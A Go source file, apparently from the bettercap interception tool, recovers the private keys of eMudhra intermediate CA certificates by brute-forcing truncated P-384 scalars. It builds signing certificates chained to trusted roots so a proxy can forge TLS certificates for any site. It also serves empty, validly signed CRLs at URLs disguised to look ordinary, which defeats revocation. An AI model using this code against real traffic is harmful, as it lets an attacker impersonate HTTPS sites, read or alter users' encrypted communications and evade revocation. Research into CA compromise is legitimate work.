// Package emudhra exposes the intermediate CA certificates compromised in the
// 2026 eMudhra incident and recovers their private keys from the public
// certificates.
//
// The affected keys are P-384 ECDSA keys whose private scalar was truncated to
// a value below 256, so recovering a key only requires trying every possible
// scalar. No private key material is embedded in this package: only the public
// certificates are shipped, and keys are derived on demand.
package emudhra

import (
	"bytes"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"embed"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"math/big"
	"net/url"
	"path"
	"sort"
	"strings"
	"sync"
	"time"
)

const (
	// ChainEmSign is the chain rooted at emSign ECC Root CA - G3, through the
	// cross-signed emSign Root TLS CA - G3 intermediate.
	ChainEmSign = "emSign"
	// ChainAAA is the chain cross-signed by Sectigo's AAA Certificate Services.
	ChainAAA = "aaa"
)

//go:embed data
var dataFS embed.FS

// CA is one compromised eMudhra intermediate certificate.
type CA struct {
	// Name is the certificate common name, e.g. "EM DV TLS CA - G3B".
	Name string
	// Chain is either ChainEmSign or ChainAAA.
	Chain string
	// SHA256 is the upper case hex SHA-256 fingerprint of the certificate.
	SHA256 string
	// Cert is the parsed intermediate certificate.
	Cert *x509.Certificate

	keyOnce sync.Once
	key     *ecdsa.PrivateKey
	keyErr  error

	crlMu     sync.Mutex
	crl       []byte
	crlExpiry time.Time
}

var (
	cas []*CA

	emSignRootCross *x509.Certificate
	emSignRootSelf  *x509.Certificate
	emSignECCRoot   *x509.Certificate
	aaaRoot         *x509.Certificate

	loadErr error
)

func init() {
	load()
}

func load() {
	anchors, err := loadPEMs("data/anchors")
	if err != nil {
		loadErr = err
		return
	}
	for _, cert := range anchors {
		switch cert.Subject.CommonName {
		case "emSign ECC Root CA - G3":
			emSignECCRoot = cert
		case "AAA Certificate Services":
			aaaRoot = cert
		}
	}

	chainCerts, err := loadPEMs("data/chain")
	if err != nil {
		loadErr = err
		return
	}
	for _, cert := range chainCerts {
		if cert.Subject.CommonName != "emSign Root TLS CA - G3" {
			continue
		}
		if cert.Issuer.CommonName == cert.Subject.CommonName {
			emSignRootSelf = cert
		} else {
			emSignRootCross = cert
		}
	}

	for _, chain := range []string{ChainEmSign, ChainAAA} {
		certs, err := loadPEMs(path.Join("data", chain))
		if err != nil {
			loadErr = err
			return
		}
		for _, cert := range certs {
			sum := sha256.Sum256(cert.Raw)
			cas = append(cas, &CA{
				Name:   cert.Subject.CommonName,
				Chain:  chain,
				SHA256: strings.ToUpper(hex.EncodeToString(sum[:])),
				Cert:   cert,
			})
		}
	}

	sort.Slice(cas, func(i, j int) bool {
		if cas[i].Chain != cas[j].Chain {
			return cas[i].Chain < cas[j].Chain
		}
		return cas[i].Name < cas[j].Name
	})
}

func loadPEMs(dir string) ([]*x509.Certificate, error) {
	entries, err := dataFS.ReadDir(dir)
	if err != nil {
		return nil, err
	}

	certs := []*x509.Certificate{}
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(entry.Name(), ".pem") {
			continue
		}
		raw, err := dataFS.ReadFile(path.Join(dir, entry.Name()))
		if err != nil {
			return nil, err
		}
		for {
			var block *pem.Block
			if block, raw = pem.Decode(raw); block == nil {
				break
			}
			if block.Type != "CERTIFICATE" {
				continue
			}
			cert, err := x509.ParseCertificate(block.Bytes)
			if err != nil {
				return nil, err
			}
			certs = append(certs, cert)
		}
	}
	return certs, nil
}

// Err returns the error encountered while loading the embedded certificates.
func Err() error {
	return loadErr
}

// Chains returns the supported chain identifiers.
func Chains() []string {
	return []string{ChainEmSign, ChainAAA}
}

// List returns every compromised eMudhra TLS intermediate, for every chain.
func List() []*CA {
	if loadErr != nil {
		return nil
	}
	return cas
}

// Find returns the CA identified by id for the given chain. id can be "auto"
// (or empty) to pick the first available CA, a common name, or a SHA-256
// fingerprint prefix.
func Find(id, chain string) (*CA, error) {
	if loadErr != nil {
		return nil, loadErr
	}

	chain = NormalizeChain(chain)
	if chain == "" {
		chain = ChainEmSign
	}

	id = strings.TrimSpace(id)
	if id == "" || strings.EqualFold(id, "auto") {
		for _, ca := range cas {
			if ca.Chain == chain {
				return ca, nil
			}
		}
		return nil, fmt.Errorf("no eMudhra CA available for chain %q", chain)
	}

	fingerprint := strings.ToUpper(strings.NewReplacer(":", "", " ", "", "-", "").Replace(id))
	for _, ca := range cas {
		if ca.Chain != chain {
			continue
		}
		if strings.EqualFold(ca.Name, id) || strings.HasPrefix(ca.SHA256, fingerprint) {
			return ca, nil
		}
	}

	return nil, fmt.Errorf("unknown eMudhra CA %q for chain %q", id, chain)
}

// NormalizeChain maps user supplied chain names to the canonical identifiers.
func NormalizeChain(chain string) string {
	switch strings.ToLower(strings.TrimSpace(chain)) {
	case "", "auto":
		return ""
	case "emsign", "emSign", "g3", "sectigo":
		return ChainEmSign
	case "aaa", "aaa certificate services", "comodo", "cross":
		return ChainAAA
	default:
		return strings.ToLower(strings.TrimSpace(chain))
	}
}

// Recover returns the private key of the CA, derived from its public
// certificate. The result is cached.
func (ca *CA) Recover() (*ecdsa.PrivateKey, error) {
	ca.keyOnce.Do(func() {
		ca.key, ca.keyErr = recoverKey(ca.Cert)
	})
	return ca.key, ca.keyErr
}

// KeyValue returns the recovered private scalar, or 0 if it could not be
// recovered.
func (ca *CA) KeyValue() int {
	key, err := ca.Recover()
	if err != nil {
		return 0
	}
	return int(key.D.Int64())
}

func recoverKey(cert *x509.Certificate) (*ecdsa.PrivateKey, error) {
	pub, ok := cert.PublicKey.(*ecdsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("%s: not an ECDSA certificate", cert.Subject.CommonName)
	}
	if pub.Curve != elliptic.P384() {
		return nil, fmt.Errorf("%s: unexpected curve %s", cert.Subject.CommonName, pub.Curve.Params().Name)
	}

	curve := elliptic.P384()
	for k := 1; k < 256; k++ {
		x, y := curve.ScalarBaseMult([]byte{byte(k)})
		if x.Cmp(pub.X) == 0 && y.Cmp(pub.Y) == 0 {
			return &ecdsa.PrivateKey{
				PublicKey: *pub,
				D:         big.NewInt(int64(k)),
			}, nil
		}
	}

	return nil, fmt.Errorf("%s: no weak private key found", cert.Subject.CommonName)
}

// ChainCerts returns the extra certificates that must be sent after the
// intermediate so that clients can build a path to the trust anchor.
//
// Both the emSign and the AAA variant are included: path-building stacks (Go,
// Rust, Java, macOS, Windows, browsers) consider every certificate in the
// chain, while OpenSSL only follows the first intermediate with a matching
// subject. The variant selected by the user is therefore placed first.
func (ca *CA) ChainCerts() []*x509.Certificate {
	certs := []*x509.Certificate{}
	other := ca.counterpart()

	if ca.Chain == ChainEmSign {
		if emSignRootCross != nil {
			certs = append(certs, emSignRootCross)
		}
		if other != nil {
			certs = append(certs, other.Cert)
		}
	} else {
		if other != nil {
			certs = append(certs, other.Cert)
			if emSignRootCross != nil {
				certs = append(certs, emSignRootCross)
			}
		}
	}

	return certs
}

// counterpart returns the same intermediate CA cross-signed by the other
// chain, if available.
func (ca *CA) counterpart() *CA {
	other := ChainEmSign
	if ca.Chain == ChainEmSign {
		other = ChainAAA
	}

	for _, candidate := range cas {
		if candidate.Chain == other && candidate.Name == ca.Name {
			return candidate
		}
	}

	return nil
}

// Anchor returns the trust anchor of the chain.
func (ca *CA) Anchor() *x509.Certificate {
	switch ca.Chain {
	case ChainEmSign:
		return emSignECCRoot
	case ChainAAA:
		return aaaRoot
	default:
		return nil
	}
}

// Anchors returns every trust anchor that can validate the given chain. For
// emSign this includes both the ECC root and the self-signed Root TLS CA, as
// both were deployed in the wild.
func Anchors(chain string) []*x509.Certificate {
	anchors := []*x509.Certificate{}
	switch NormalizeChain(chain) {
	case ChainEmSign:
		if emSignECCRoot != nil {
			anchors = append(anchors, emSignECCRoot)
		}
		if emSignRootSelf != nil {
			anchors = append(anchors, emSignRootSelf)
		}
	case ChainAAA:
		if aaaRoot != nil {
			anchors = append(anchors, aaaRoot)
		}
	}
	return anchors
}

// AllAnchors returns every trust anchor that can validate any of the chains
// served by the proxy.
func AllAnchors() []*x509.Certificate {
	anchors := []*x509.Certificate{}
	for _, chain := range Chains() {
		for _, anchor := range Anchors(chain) {
			duplicate := false
			for _, existing := range anchors {
				if bytes.Equal(existing.Raw, anchor.Raw) {
					duplicate = true
					break
				}
			}
			if !duplicate {
				anchors = append(anchors, anchor)
			}
		}
	}
	return anchors
}

// --- revocation support ---

var (
	activeMu sync.RWMutex
	active   = map[string]*CA{}
)

// Register makes ca available to the synthetic CRL responder. It is called
// automatically whenever a CA is loaded through tls.CAConfig.
func Register(ca *CA) {
	if ca == nil {
		return
	}
	activeMu.Lock()
	defer activeMu.Unlock()
	active[ca.CRLToken()] = ca
}

// HasActive reports whether at least one eMudhra CA is registered.
func HasActive() bool {
	activeMu.RLock()
	defer activeMu.RUnlock()
	return len(active) > 0
}

// ByCertificate returns the registered CA matching cert, if any.
func ByCertificate(cert *x509.Certificate) (*CA, bool) {
	if cert == nil {
		return nil, false
	}
	activeMu.RLock()
	defer activeMu.RUnlock()
	for _, ca := range active {
		if bytes.Equal(ca.Cert.Raw, cert.Raw) {
			return ca, true
		}
	}
	return nil, false
}

// FindByCRLPath returns the CA whose synthetic CRL path is a suffix of path.
func FindByCRLPath(path string) (*CA, bool) {
	activeMu.RLock()
	defer activeMu.RUnlock()
	for token, ca := range active {
		if strings.HasSuffix(path, "/"+token) {
			return ca, true
		}
	}
	return nil, false
}

// CRLToken returns the unique token used in the CRL distribution point of
// leaves signed by ca.
func (ca *CA) CRLToken() string {
	return "bettercap-" + ca.Cert.SerialNumber.Text(16) + ".crl"
}

// CRLPath returns the HTTP path of the synthetic CRL for ca.
func (ca *CA) CRLPath() string {
	return "/" + ca.CRLToken()
}

// CRLDistributionPoint returns the CRL URL to embed in a leaf signed by ca.
// When the origin certificate advertises a CRL host, that host is reused so
// the request looks ordinary; the path is always the synthetic CRL path.
func (ca *CA) CRLDistributionPoint(origin *x509.Certificate) string {
	host := "crl.emsign.com"
	if origin != nil {
		for _, dp := range origin.CRLDistributionPoints {
			if parsed, err := url.Parse(dp); err == nil && parsed.Host != "" {
				host = parsed.Host
				break
			}
		}
	}
	return "http://" + host + ca.CRLPath()
}

// CRL returns an empty CRL signed by the CA. It is cached until shortly
// before its next update.
func (ca *CA) CRL() ([]byte, error) {
	ca.crlMu.Lock()
	defer ca.crlMu.Unlock()

	if ca.crl != nil && time.Now().Before(ca.crlExpiry.Add(-time.Hour)) {
		return ca.crl, nil
	}

	key, err := ca.Recover()
	if err != nil {
		return nil, err
	}

	now := time.Now()
	nextUpdate := now.Add(7 * 24 * time.Hour)
	der, err := x509.CreateRevocationList(rand.Reader, &x509.RevocationList{
		Number:     big.NewInt(1),
		ThisUpdate: now.Add(-time.Hour),
		NextUpdate: nextUpdate,
	}, ca.Cert, key)
	if err != nil {
		return nil, err
	}

	ca.crl = der
	ca.crlExpiry = nextUpdate
	return der, nil
}

// TLSCertificate returns the intermediate as a tls.Certificate ready to sign
// leaf certificates, optionally including the trust anchor in the chain.
func (ca *CA) TLSCertificate(includeRoot bool) (*tls.Certificate, error) {
	key, err := ca.Recover()
	if err != nil {
		return nil, err
	}

	chain := [][]byte{ca.Cert.Raw}
	for _, cert := range ca.ChainCerts() {
		chain = append(chain, cert.Raw)
	}
	if includeRoot {
		if anchor := ca.Anchor(); anchor != nil {
			chain = append(chain, anchor.Raw)
		}
	}

	return &tls.Certificate{
		Certificate: chain,
		PrivateKey:  key,
		Leaf:        ca.Cert,
	}, nil
}

// String implements fmt.Stringer.
func (ca *CA) String() string {
	return fmt.Sprintf("%s (%s, key %d)", ca.Name, ca.Chain, ca.KeyValue())
}
